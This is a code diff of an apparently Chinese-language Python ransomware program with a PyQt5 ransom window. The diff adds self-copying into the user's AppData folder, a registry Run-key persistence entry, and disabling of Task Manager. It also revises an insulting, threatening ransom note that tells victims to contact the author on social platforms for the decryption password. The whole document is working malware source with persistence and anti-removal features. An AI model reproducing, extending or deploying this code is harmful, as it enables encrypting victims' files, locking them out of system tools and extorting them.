@@ -1,14 +1,41 @@
 from PyQt5 import QtCore, QtGui, QtWidgets
 import sys
 import os
-import uuid
 import random
 import ctypes
+import winreg
 
 
-bsf = abs(random.randint(-44351348748004,uuid.getnode()))
+bsf = abs(random.randint(-44351348748004,93680776625527))
 pswd= str(hash(str(len(str(bsf))+73/9+bsf)))
+filepath=f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\himrs.exe'
 
+
+if os.getcwd() != "C:\\Users\\{os.getlogin()}\\AppData\\Roaming":
+    with open(sys.argv[0] ,'rb') as f:
+        data=f.read()
+        with open(filepath , 'wb') as f1:
+            f1.write(data)
+       
+
+def killtask(key):
+
+    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+    key_name = "DisableTaskMgr"
+    keys = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+    winreg.SetValueEx(keys, key_name, 0, winreg.REG_DWORD, key)
+    winreg.CloseKey(keys)
+    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
+    try:
+        if key == 1:
+            winreg.SetValueEx(reg_key, "himProgram", 0, winreg.REG_SZ, filepath)
+            winreg.CloseKey(reg_key)
+        else:
+            winreg.DeleteValue(reg_key, "himProgram")
+            winreg.CloseKey(reg_key)
+    except:
+        pass
 
 class cip:
     def __init__(self, file):
@@ -36,6 +63,11 @@ class cip:
                     pass
             with open(self.file, 'wb') as file_write:
                 file_write.write(bytes(original_data))
+
+
+def ends():
+    killtask(0)
+
             
 
 class Ui_Form():
@@ -74,6 +106,7 @@ class Ui_Form():
         self.toolButton.setStyleSheet("background-color: rgb(179, 179, 179);")
         self.toolButton.setObjectName("toolButton")
         self.toolButton.setText("恢复文件")
+        self.toolButton.clicked.connect(ends)
 
         self.textBrowser = QtWidgets.QTextBrowser(Form)
         self.textBrowser.setGeometry(QtCore.QRect(30, 240, 181, 91))
@@ -97,7 +130,7 @@ class Ui_Form():
                                            "p, li { white-space: pre-wrap; }\n"
                                            "</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
                                            "<p align=\"center\" style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt; font-weight:600;\">你的文件已经被我吃掉了，明天我拉出来给你</span></p>\n"
-                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">惊不惊喜！意不意外！你的文件已经被你爷爷我him加密了，想要回来？在b站联系我，搜Technology_him和我私信要密码，记得报上你的标识符，不然我可没办法给你解开哦！还有就是请勿将被我加密的文件(*.himnb)改回去，要不然我会再加密一次，你可就难以要回你文件了，看看我精心给你准备的桌面，你看看那早已成仙的那帅气的我，像不像你爹！总之想要回文件就得联系我，我要是心情好可能直接无偿给你密钥，我这人并不是很喜欢钱，所以大概率我不要钱，但是你需要取悦我，听从我的要求，否则我会让你吃不了兜着走！当然，除了b站你也可以在其他平台联系我，你要是找得到就行，找不到你吃屎去！不要想着解除此病毒，否则你就别要回你的文件了！</span></p>\n"
+                                           "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">惊不惊喜！意不意外！你的文件已经被你爷爷我him加密了，想要回来？在b站联系我，搜Technology_him和我私信要密码，记得报上你的标识符，不然我可没办法给你解开哦！还有就是请勿将被我加密的文件(*.himnb)改回去，要不然我会再加密一次，你可就难以要回你文件了，看看我精心给你准备的桌面，你看看那早已成仙的那帅气的我，像不像你爹！总之想要回文件就得联系我，我要是心情好可能直接无偿给你密钥，我这人并不是很喜欢钱，所以大概率我不要钱，但是你需要取悦我，听从我的要求，否则我会让你吃不了兜着走！当然，除了b站你也可以在其他平台联系我，你要是找得到就行，找不到你吃屎去！不要想着自己解除此病毒，否则你就别要回你的文件了！恢复完文件后可以再清除此病毒!</span></p>\n"
                                            "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">b站：Technology_him</span></p>\n"
                                            "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">抖音：szylbz.1314</span></p>\n"
                                            "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt;\">QQ：715387640（不稳定）</span></p>\n"
@@ -115,6 +148,7 @@ class FormWidget(QtWidgets.QWidget):
         event.ignore()  
 
 if __name__ == '__main__':
+    killtask(1)
     ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:\Users\{0}\AppData\Roaming\him.png'.format(os.getlogin()), 3)
     app = QtWidgets.QApplication(sys.argv)
     widget = FormWidget()
